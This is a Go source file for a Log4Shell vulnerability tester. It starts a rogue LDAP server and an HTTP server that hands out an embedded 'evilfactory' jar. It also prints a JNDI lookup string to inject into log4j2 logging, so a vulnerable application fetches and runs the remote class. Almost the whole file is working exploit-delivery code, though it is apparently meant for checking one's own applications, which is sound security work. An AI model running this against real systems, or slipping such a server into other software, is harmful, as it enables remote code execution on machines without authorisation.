package main

import (
	"embed"
	"fmt"
	"github.com/logrusorgru/aurora"
	"github.com/lor00x/goldap/message"
	ldap "github.com/vjeantet/ldapserver"
	"io"
	"io/ioutil"
	"log"
	"net"
	"net/http"
	"os"
	"os/signal"
	"reflect"
	"strings"
	"syscall"
	"unsafe"
)

//go:embed evilfactory-1.0-SNAPSHOT.jar
var jar embed.FS

func main() {
	printUsage()
	ldapServer := startLdapServer()
	startHttpServer()

	ch := make(chan os.Signal)
	signal.Notify(ch, syscall.SIGINT, syscall.SIGTERM)
	<-ch
	close(ch)
	ldapServer.Stop()
}

func printUsage() {
	fmt.Println("Try to make log4j2 to print ${jndi:ldap://<IP>:1389/probably_not_vulnerable}")
	fmt.Println("Example: ")
	fmt.Println("----")
	fmt.Println(aurora.Blue(`package info.jerrinot.log4shell.test;

import org.apache.logging.log4j.LogManager;

public class Main {
    public static void main(String[] args) throws Exception {
        LogManager.getLogger(Main.class).fatal("${jndi:ldap://172.17.0.2:1389/probably_not_vulnerable}");
    }
}`))
	fmt.Println("----")
	if isRunningInDockerContainer() {
		fmt.Println("I appears this application is running inside a container. ")
	} else {
		fmt.Println("I appears this application is NOT running inside a container. This means you have to use IP address of this host in the jndi string.")
		fmt.Printf("Here are possible IP addresses: %s\n", strings.Join(getIpv4Addresses(), ", "))
		fmt.Println("Test connectivity by running \"curl http://<IP>:3000\" from the same computer where the target application is running.")
	}
}

func startLdapServer() *ldap.Server {
	ldap.Logger = log.New(ioutil.Discard, "", log.LstdFlags)
	server := ldap.NewServer()
	routes := ldap.NewRouteMux()
	routes.Search(handleSearch)
	routes.Bind(handleBind)
	server.Handle(routes)
	go func() {
		err := server.ListenAndServe("0.0.0.0:1389")
		if err != nil {
			panic(err)
		}
	}()
	return server
}

func getIpv4Addresses() []string {
	addrs, err := net.InterfaceAddrs()
	if err != nil {
		panic(err)
	}

	var result []string
	for _, addr := range addrs {
		address := strings.Split(addr.String(), "/")[0]
		if address != "127.0.0.1" && !strings.Contains(address, "::") {
			result = append(result, address)
		}
	}
	return result
}

func isRunningInDockerContainer() bool {
	if _, err := os.Stat("/.dockerenv"); err == nil {
		return true
	}
	return false
}

func handleIndex(w http.ResponseWriter, req *http.Request) {
	w.WriteHeader(http.StatusOK)
	host := req.Host
	host = strings.Split(host, ":")[0]
	ldapUrl := aurora.Green(fmt.Sprintf("${jndi:ldap://%s:1389/probably_not_vulnerable}", host))
	io.WriteString(w, fmt.Sprintf("To test an application try to make log4j print %s\n", ldapUrl))
}

func startHttpServer() {
	var staticFS = http.FS(jar)
	fs := http.FileServer(staticFS)
	http.Handle("/evilfactory-1.0-SNAPSHOT.jar", fs)
	http.HandleFunc("/", handleIndex)
	go func() {
		err := http.ListenAndServe(":3000", nil)
		if err != nil {
			panic(err)
		}
	}()
}

func getOwnAddress(m *ldap.Message) string {
	foo := m.Client
	rs := reflect.ValueOf(foo).Elem()
	rf := rs.Field(2)
	rf = reflect.NewAt(rf.Type(), unsafe.Pointer(rf.UnsafeAddr())).Elem()
	con := rf.Interface().(net.Conn)
	return strings.Split(con.LocalAddr().String(), ":")[0]
}

func handleSearch(w ldap.ResponseWriter, m *ldap.Message) {
	r := m.GetSearchRequest()
	select {
	case <-m.Done:
		log.Print("Leaving handleSearch...")
		return
	default:
	}
	fmt.Printf("Received request from %s\n", aurora.Green(m.Client.GetConn().RemoteAddr()))
	codebase := message.AttributeValue(fmt.Sprintf("http://%s:3000/evilfactory-1.0-SNAPSHOT.jar", getOwnAddress(m)))
	e := ldap.NewSearchResultEntry("cn=pwned, " + string(r.BaseObject()))
	e.AddAttribute("cn", "pwned")
	e.AddAttribute("javaClassName", "probably vulnerable")
	e.AddAttribute("javaCodeBase", codebase)
	e.AddAttribute("objectclass", "javaNamingReference")
	e.AddAttribute("javaFactory", "info.jerrinot.log4shell.evilfactory.EvilFactory")
	w.Write(e)

	res := ldap.NewSearchResultDoneResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}

func handleBind(w ldap.ResponseWriter, m *ldap.Message) {
	res := ldap.NewBindResponse(ldap.LDAPResultSuccess)
	w.Write(res)
}
